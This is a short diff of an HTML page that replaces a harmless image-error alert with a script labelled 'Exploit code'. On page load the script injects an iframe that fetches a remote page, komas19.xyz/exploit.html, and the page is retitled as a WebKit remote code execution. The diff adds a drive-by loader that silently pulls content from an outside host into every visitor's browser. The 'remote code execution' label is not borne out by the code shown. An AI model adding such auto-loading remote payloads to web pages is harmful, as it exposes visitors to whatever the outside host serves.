@@ -1,14 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>HTMLImageLoader Vulnerability Example</title>
+  <title>Webkit Remote Code Execution Vulnerability</title>
+  <script>
+    // Exploit code
+    function exploit() {
+      var iframe = document.createElement('iframe');
+      iframe.src = 'https://komas19.xyz/exploit.html';
+      document.body.appendChild(iframe);
+    }
+    
+    // Triggering the exploit
+    exploit();
+  </script>
 </head>
 <body>
   <img id="image" src="non_existent_image.jpg" alt="Example Image">
-  <script>
-    document.getElementById("image").addEventListener("error", function() {
-      alert("Error loading image!");
-    });
-  </script>
 </body>
 </html>
